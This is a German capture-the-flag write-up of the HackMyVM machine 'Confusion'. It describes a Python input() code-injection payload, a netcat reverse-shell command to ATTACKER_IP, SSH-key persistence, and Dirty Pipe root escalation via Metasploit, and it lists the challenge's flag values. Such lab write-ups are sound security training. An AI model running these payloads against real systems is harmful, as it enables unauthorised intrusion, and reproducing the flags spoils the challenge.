# Confusion - HackMyVM (Medium)

![Confusion Icon](Confusion.png)

## Übersicht

*   **VM:** Confusion
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Confusion)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 1. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Confusion_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Confusion" von HackMyVM (Schwierigkeitsgrad: Medium) wurde durch eine Kette von Schwachstellen kompromittiert. Der initiale Zugriff erfolgte durch eine Python Code Injection-Schwachstelle in einem benutzerdefinierten Netzwerkdienst auf Port 32145, der die `input()`-Funktion unsicher verwendete. Dies ermöglichte die Ausführung von Befehlen als Benutzer `iamroot` und die Etablierung einer Reverse Shell. Die Privilegienerweiterung zu Root wurde durch die Ausnutzung der bekannten Kernel-Schwachstelle CVE-2022-0847 ("Dirty Pipe") erreicht, wobei das Metasploit Framework zur Identifizierung und Ausführung des Exploits verwendet wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nikto`
*   `nmap`
*   `telnet`
*   `nc` (netcat)
*   `python` / `python3` (für Shell-Stabilisierung und RCE-Payload)
*   `stty`
*   `sudo`
*   `ss`
*   `find`
*   `cat`, `echo`, `vi`
*   `ssh`
*   Metasploit Framework (`msfconsole`):
    *   `exploit/multi/handler`
    *   `post/multi/manage/shell_to_meterpreter`
    *   `exploit/linux/local/cve_2022_0847_dirtypipe`
*   Standard Linux-Befehle (`id`, `ls`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Confusion" erfolgte in diesen Schritten:

1.  **Reconnaissance:**
    *   Ziel-IP (`192.168.2.109`, Hostname `confusion.hmv`) via `arp-scan` identifiziert.
    *   `nikto` auf Port 80 fand keinen Webserver.
    *   `nmap` zeigte offene Ports: 22 (SSH 8.4p1) und **32145** (unbekannter Dienst).
    *   Die Nmap-Fingerprinting-Skripte für Port 32145 zeigten Python-Tracebacks aus `/opt/ping.py`, die auf die Verwendung der `input()`-Funktion hindeuteten und bei HTTP-ähnlichen Anfragen fehlschlugen (`NameError`).

2.  **Initial Access (Python Input Injection):**
    *   Eine Telnet-Verbindung zu Port 32145 wurde hergestellt.
    *   Die Eingabeaufforderung "How many times you want to ping?:" wurde mit Python-Code beantwortet.
    *   Der Payload `eval('__import__("os").system("id")')` wurde gesendet, was die Ausführung des `id`-Befehls als Benutzer `iamroot` bestätigte.
    *   Weitere Befehle (`ls /home`, `ls /home/sammy`) zeigten die Benutzer `iamroot`, `sammy`, `still` und eine `user.txt` in Sammys Home, die aber für `iamroot` nicht lesbar war.
    *   Mittels `eval('__import__("os").system("nc -e /bin/bash ATTACKER_IP 8005")')` wurde eine Reverse Shell als `iamroot` zum Angreifer etabliert.
    *   Die Shell wurde stabilisiert.

3.  **Privilege Escalation Preparation (als iamroot):**
    *   `sudo -l` für `iamroot` zeigte die Regel `(!root) NOPASSWD: /bin/bash`, die keine direkte Root-Eskalation erlaubte.
    *   Keine ungewöhnlichen SUID-Dateien oder Capabilities gefunden.
    *   SSH-Zugriff als `iamroot` wurde durch Hinzufügen des eigenen öffentlichen Schlüssels zu `~/.ssh/authorized_keys` eingerichtet.
    *   Die Kernel-Version wurde als `Linux confusion 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30)` identifiziert, bekannt als anfällig für CVE-2022-0847 (Dirty Pipe).

4.  **Privilege Escalation (Dirty Pipe via Metasploit):**
    *   Die `iamroot`-Shell (via `nc`) wurde in eine Metasploit-Shell-Session (Session 1) überführt (`exploit/multi/handler`).
    *   Diese Shell-Session wurde zu einer Meterpreter-Session (Session 2) aufgewertet (`post/multi/manage/shell_to_meterpreter`).
    *   (Der `local_exploit_suggester` wurde im Log nicht explizit verwendet, aber der Dirty Pipe Exploit direkt ausgewählt, vermutlich basierend auf der Kernel-Kenntnis).
    *   Das Metasploit-Modul `exploit/linux/local/cve_2022_0847_dirtypipe` wurde konfiguriert (Session 2, `WRITABLE_DIR=/tmp`) und ausgeführt.
    *   Der Exploit war erfolgreich und öffnete eine neue Meterpreter-Session (Session 3) mit Root-Rechten.
    *   Innerhalb der Root-Meterpreter-Session wurde eine System-Shell geöffnet (`shell`).
    *   Die User- und Root-Flags wurden gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Python `input()` Code Injection:** Unsichere Verwendung der `input()`-Funktion in einem Python-Netzwerkdienst, die Remote Code Execution ermöglichte.
*   **Kernel Exploit (CVE-2022-0847 - Dirty Pipe):** Ausnutzung einer bekannten Schwachstelle im Linux-Kernel zur lokalen Privilegienerweiterung.
*   **Verwendung von Metasploit Framework:** Für Session-Management, Exploit-Suche und Ausführung.
*   **Ungewöhnliche `sudo`-Regel:** Bot keine direkte Eskalation, hätte aber für Lateral Movement genutzt werden können.
*   **Informationslecks durch Tracebacks:** Preisgabe von Skriptpfaden und Funktionsnamen.

## Flags

*   **User Flag (`/home/sammy/user.txt`):** `806451a0d37e94c20ea85f4e8e9ad3b8`
*   **Root Flag (`/root/root.txt`):** `cb9e279429419f5326e7755ba43c7055`

## Tags

`HackMyVM`, `Confusion`, `Medium`, `Python`, `Input Injection`, `RCE`, `Dirty Pipe`, `CVE-2022-0847`, `Kernel Exploit`, `Metasploit`, `Linux`
